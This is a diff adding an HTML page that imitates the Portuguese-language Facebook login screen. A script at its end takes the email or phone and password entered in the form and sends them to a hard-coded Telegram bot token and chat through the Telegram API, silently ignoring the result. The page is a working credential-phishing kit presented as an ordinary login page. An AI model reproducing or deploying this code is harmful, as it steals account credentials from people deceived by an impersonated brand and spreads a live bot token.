@@ -1,0 +1,110 @@
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="flex flex-col items-center justify-center min-h-screen">
+        <div class="flex flex-col md:flex-row items-center justify-center w-full max-w-6xl px-4">
+            <div class="text-center md:text-left md:w-1/2 mb-8 md:mb-0">
+                <h1 class="text-blue-600 text-5xl font-bold">facebook</h1>
+                <p class="text-xl mt-4">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
+                <form id="loginForm">
+                    <div class="mb-4">
+                        <input type="text" id="email" placeholder="Email ou telefone" class="w-full p-3 border border-gray-300 rounded-lg">
+                    </div>
+                    <div class="mb-4">
+                        <input type="password" id="password" placeholder="Senha" class="w-full p-3 border border-gray-300 rounded-lg">
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 text-white p-3 rounded-lg font-bold">Entrar</button>
+                    <div class="text-center mt-4">
+                        <a href="#" class="text-blue-600">Esqueceu a senha?</a>
+                    </div>
+                    <hr class="my-4">
+                    <button type="button" class="w-full bg-green-600 text-white p-3 rounded-lg font-bold">Criar nova conta</button>
+                </form>
+            </div>
+        </div>
+        <div class="mt-8 text-center">
+            <p class="text-sm">
+                <a href="#" class="text-blue-600 font-bold">Crie uma Página</a> para uma celebridade, uma marca ou uma empresa.
+            </p>
+        </div>
+    </div>
+    <footer class="mt-12 w-full bg-gray-100 py-4">
+        <div class="flex flex-col items-center">
+            <div class="flex flex-wrap justify-center space-x-4 text-sm text-gray-600 mb-4">
+                <a href="#">Português (Brasil)</a>
+                <a href="#">English (US)</a>
+                <a href="#">Español</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Italiano</a>
+                <a href="#">Deutsch</a>
+                <a href="#">العربية</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+                <a href="#" class="text-gray-600"><i class="fas fa-plus"></i></a>
+            </div>
+            <div class="flex flex-wrap justify-center space-x-4 text-xs text-gray-600">
+                <a href="#">Cadastre-se</a>
+                <a href="#">Entrar</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Vídeo</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Central de Informações de Votação</a>
+                <a href="#">Central de Privacidade</a>
+                <a href="#">Sobre</a>
+                <a href="#">Criar anúncio</a>
+                <a href="#">Criar Página</a>
+                <a href="#">Desenvolvedores</a>
+                <a href="#">Escolhas para anúncios</a>
+                <a href="#">Termos</a>
+                <a href="#">Ajuda</a>
+                <a href="#">Upload de contatos e não usuários</a>
+                <a href="#">Carreiras</a>
+                <a href="#">Cookies</a>
+            </div>
+            <div class="text-xs text-gray-600 mt-4">
+                Meta © 2025
+            </div>
+        </div>
+    </footer>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const botToken = '7195937063:AAHsI5eGpB6DThteW6zbwbTWUesyNynjotw';
+            const chatId = '-4756494786';
+            const message = `Email ou telefone: ${email}\nSenha: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    // Dados enviados com sucesso, não fazer nada
+                })
+                .catch(error => {
+                    // Erro ao enviar dados, não fazer nada
+                });
+        });
+    </script>
+</body>
+</html>
